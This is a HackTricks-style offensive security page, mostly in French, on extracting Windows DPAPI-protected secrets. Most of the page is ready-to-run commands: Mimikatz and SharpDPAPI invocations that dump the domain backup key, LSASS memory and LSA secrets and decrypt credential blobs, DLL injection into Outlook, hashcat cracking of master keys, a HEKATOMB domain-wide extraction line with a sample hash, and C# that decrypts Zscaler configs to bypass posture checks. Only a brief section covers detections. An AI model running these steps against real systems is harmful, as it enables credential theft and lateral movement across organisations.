# DPAPI - Extraction de mots de passe

{{#include ../../banners/hacktricks-training.md}}



## Qu'est-ce que DPAPI

The Data Protection API (DPAPI) est principalement utilisée dans le système d'exploitation Windows pour le **chiffrement symétrique de clés privées asymétriques**, en s'appuyant soit sur des secrets utilisateur soit sur des secrets système comme source importante d'entropie. Cette approche simplifie le chiffrement pour les développeurs en leur permettant de chiffrer des données avec une clé dérivée des secrets de connexion de l'utilisateur ou, pour le chiffrement système, des secrets d'authentification du domaine du système, évitant ainsi aux développeurs de devoir protéger la clé de chiffrement eux-mêmes.

La façon la plus courante d'utiliser DPAPI est via les fonctions **`CryptProtectData` et `CryptUnprotectData`**, qui permettent aux applications de chiffrer et déchiffrer des données de manière sécurisée avec la session du processus actuellement connecté. Cela signifie que les données chiffrées ne peuvent être déchiffrées que par le même utilisateur ou système qui les a chiffrées.

De plus, ces fonctions acceptent aussi un **`entropy` parameter** qui est utilisé lors du chiffrement et du déchiffrement ; par conséquent, pour déchiffrer quelque chose chiffré avec ce paramètre, vous devez fournir la même valeur d'entropie qui a été utilisée lors du chiffrement.

### Génération de la clé utilisateur

DPAPI génère une clé unique (appelée **`pre-key`**) pour chaque utilisateur basée sur ses identifiants. Cette clé est dérivée du mot de passe de l'utilisateur et d'autres facteurs ; l'algorithme dépend du type d'utilisateur mais aboutit à un SHA1. Par exemple, pour les utilisateurs de domaine, **elle dépend du hash NTLM de l'utilisateur**.

Cela est particulièrement intéressant car si un attaquant peut obtenir le hash du mot de passe de l'utilisateur, il peut :

- **Déchiffrer n'importe quelle donnée qui a été chiffrée avec DPAPI** avec la clé de cet utilisateur sans avoir besoin d'appeler une API
- Essayer de **craquer le mot de passe** hors ligne en tentant de générer la clé DPAPI valide

De plus, chaque fois que des données sont chiffrées par un utilisateur avec DPAPI, une nouvelle **master key** est générée. Cette master key est celle réellement utilisée pour chiffrer les données. Chaque master key est associée à un **GUID** (Globally Unique Identifier) qui l'identifie.

Les master keys sont stockées dans le répertoire **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, où `{SID}` est le Security Identifier de l'utilisateur. La master key est stockée chiffrée par la **`pre-key`** de l'utilisateur et également par une **domain backup key** pour la récupération (la même clé est donc stockée chiffrée deux fois avec deux passes différentes).

Notez que la **domain key utilisée pour chiffrer la master key se trouve sur les domain controllers et ne change jamais**, donc si un attaquant a accès au domain controller, il peut récupérer la domain backup key et déchiffrer les master keys de tous les utilisateurs du domaine.

Les blobs chiffrés contiennent le **GUID de la master key** qui a été utilisée pour chiffrer les données, dans leurs en-têtes.

> [!TIP]
> Les blobs chiffrés DPAPI commencent par **`01 00 00 00`**

Trouver les master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Avec des privilèges d'administrateur local, il est possible d'**accéder à la mémoire LSASS** pour extraire les DPAPI master keys de tous les utilisateurs connectés et la clé SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si l'utilisateur a des privilèges d'administrateur local, il peut accéder au **DPAPI_SYSTEM LSA secret** pour déchiffrer les clés maîtresses de la machine :
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si le mot de passe ou le hash NTLM de l'utilisateur est connu, vous pouvez **décrypter directement les master keys de l'utilisateur** :
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si vous êtes dans une session en tant qu'utilisateur, il est possible de demander au DC la **clé de sauvegarde pour déchiffrer les master keys via RPC**. Si vous êtes local admin et que l'utilisateur est connecté, vous pouvez **voler son session token** pour cela :
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lister Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accéder aux données chiffrées DPAPI

### Trouver les données chiffrées DPAPI

Les fichiers utilisateur couramment **protégés** se trouvent dans :

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Vérifiez également en remplaçant `\Roaming\` par `\Local\` dans les chemins ci‑dessus.

Exemples d'énumération :
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) peut trouver des DPAPI encrypted blobs dans le file system, le registry et les B64 blobs :
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Notez que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (du même dépôt) peut être utilisé pour déchiffrer, en utilisant DPAPI, des données sensibles comme les cookies.

### Clés d'accès et données

- **Use SharpDPAPI** pour récupérer des identifiants à partir de fichiers chiffrés par DPAPI de la session courante :
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtenir les informations d'identification** comme les données chiffrées et le guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Accéder aux masterkeys**:

Déchiffrer une masterkey d'un utilisateur demandant la **domain backup key** via RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
L'outil **SharpDPAPI** prend également en charge ces arguments pour le décryptage des masterkeys (remarquez qu'il est possible d'utiliser `/rpc` pour obtenir la clé de sauvegarde du domaine, `/password` pour utiliser un mot de passe en clair, ou `/pvk` pour spécifier un fichier de clé privée DPAPI du domaine...) :
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Déchiffrer les données en utilisant une masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
L'outil **SharpDPAPI** prend également en charge ces arguments pour le déchiffrement de `credentials|vaults|rdg|keepass|triage|blob|ps` (notez qu'il est possible d'utiliser `/rpc` pour obtenir la clé de sauvegarde du domaine, `/password` pour utiliser un mot de passe en clair, `/pvk` pour spécifier un fichier de clé privée DPAPI de domaine, `/unprotect` pour utiliser la session de l'utilisateur en cours...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Décrypter des données en utilisant **la session utilisateur actuelle**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Gestion de l'entropie optionnelle (« entropie tierce »)

Certaines applications transmettent une valeur d'**entropie** supplémentaire à `CryptProtectData`. Sans cette valeur, le blob ne peut pas être déchiffré, même si le masterkey correct est connu. Obtenir l'entropie est donc essentiel lorsqu'on cible des identifiants protégés de cette façon (p.ex. Microsoft Outlook, certains clients VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) est une DLL user-mode qui hooke les fonctions DPAPI à l'intérieur du processus cible et enregistre de manière transparente toute entropie optionnelle fournie. Lancer EntropyCapture en mode **DLL-injection** contre des processus tels que `outlook.exe` ou `vpnclient.exe` produira un fichier mappant chaque buffer d'entropie au processus appelant et au blob. L'entropie capturée peut ensuite être fournie à **SharpDPAPI** (`/entropy:`) ou à **Mimikatz** (`/entropy:<file>`) afin de déchiffrer les données.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft a introduit un format de masterkey **context 3** à partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) a ajouté les hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) et **22102** (context 3), permettant le cracking accéléré par GPU des mots de passe utilisateur directement depuis le fichier masterkey. Les attaquants peuvent donc effectuer des attaques word-list ou brute-force sans interagir avec le système cible.

`DPAPISnoop` (2024) automatise le processus:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
L'outil peut aussi analyser les blobs Credential et Vault, les déchiffrer avec des clés craquées et exporter les mots de passe en clair.


### Accéder aux données d'une autre machine

Dans **SharpDPAPI et SharpChrome** vous pouvez indiquer l'option **`/server:HOST`** pour accéder aux données d'une machine distante. Bien sûr, vous devez pouvoir accéder à cette machine et dans l'exemple suivant il est supposé que la **clé de sauvegarde de domaine est connue**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Autres outils

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) est un outil qui automatise l'extraction de tous les utilisateurs et ordinateurs de l'annuaire LDAP et l'extraction de la clé de sauvegarde du contrôleur de domaine via RPC. Le script résoudra ensuite les adresses IP de tous les ordinateurs et effectuera un smbclient sur tous les ordinateurs pour récupérer tous les blobs DPAPI de tous les utilisateurs et tout déchiffrer avec la clé de sauvegarde du domaine.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Avec la liste des ordinateurs extraite de LDAP, vous pouvez trouver tous les sous-réseaux même si vous ne les connaissiez pas !

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) peut dumper automatiquement des secrets protégés par DPAPI. La release 2.x a introduit :

* Collecte parallèle de blobs depuis des centaines d'hôtes
* Analyse des masterkeys **context 3** et intégration automatique du cracking avec Hashcat
* Prise en charge des cookies chiffrés Chrome "App-Bound" (voir section suivante)
* Un nouveau mode **`--snapshot`** pour sonder régulièrement des endpoints et différencier les blobs nouvellement créés

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) est un parseur C# pour fichiers masterkey/credential/vault qui peut produire des formats Hashcat/JtR et invoquer éventuellement le cracking automatiquement. Il prend en charge complètement les formats de masterkey machine et utilisateur jusqu'à Windows 11 24H1.

## Détections courantes

- Accès à des fichiers dans `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` et d'autres répertoires liés à DPAPI.
- Surtout depuis un partage réseau comme **C$** ou **ADMIN$**.
- Utilisation de **Mimikatz**, **SharpDPAPI** ou d'outils similaires pour accéder à la mémoire LSASS ou dumper des masterkeys.
- Événement **4662** : *An operation was performed on an object* – peut être corrélé avec l'accès à l'objet **`BCKUPKEY`**.
- Événements **4673/4674** lorsque qu'un processus demande *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnérabilités et évolutions de l'écosystème 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembre 2023). Un attaquant avec accès réseau pouvait tromper un membre de domaine pour qu'il récupère une clé de sauvegarde DPAPI malveillante, permettant le déchiffrement des masterkeys utilisateurs. Patché dans le cumulative update de novembre 2023 – les administrateurs doivent s'assurer que les DCs et postes de travail sont entièrement patchés.
* **Chrome 127 “App-Bound” cookie encryption** (juillet 2024) a remplacé la protection legacy uniquement DPAPI par une clé additionnelle stockée dans le **Credential Manager** de l'utilisateur. Le déchiffrement hors ligne des cookies nécessite désormais à la fois le masterkey DPAPI et la **GCM-wrapped app-bound key**. SharpChrome v2.3 et DonPAPI 2.x sont capables de récupérer la clé supplémentaire lorsqu'ils sont exécutés en contexte utilisateur.


### Étude de cas : Zscaler Client Connector – entropie personnalisée dérivée du SID

Zscaler Client Connector stocke plusieurs fichiers de configuration sous `C:\ProgramData\Zscaler` (par ex. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Chaque fichier est chiffré avec **DPAPI (Machine scope)** mais le fournisseur fournit une **entropie personnalisée** qui est *calculée à l'exécution* au lieu d'être stockée sur le disque.

L'entropie est reconstruite à partir de deux éléments :

1. Un secret en dur embarqué dans `ZSACredentialProvider.dll`.
2. Le **SID** du compte Windows auquel la configuration appartient.

L'algorithme implémenté par la DLL est équivalent à :
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Parce que le secret est intégré dans une DLL lisible depuis le disque, **tout attaquant local disposant des droits SYSTEM peut régénérer l'entropie pour n'importe quel SID** et déchiffrer les blobs hors ligne :
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Le déchiffrement fournit la configuration JSON complète, y compris chaque **device posture check** et sa valeur attendue — des informations très utiles lors de tentatives de contournement côté client.

> ASTUCE : les autres artefacts chiffrés (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sont protégés avec DPAPI **sans entropie** (`16` octets nuls). Ils peuvent donc être déchiffrés directement avec `ProtectedData.Unprotect` une fois les privilèges SYSTEM obtenus.

## Références

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
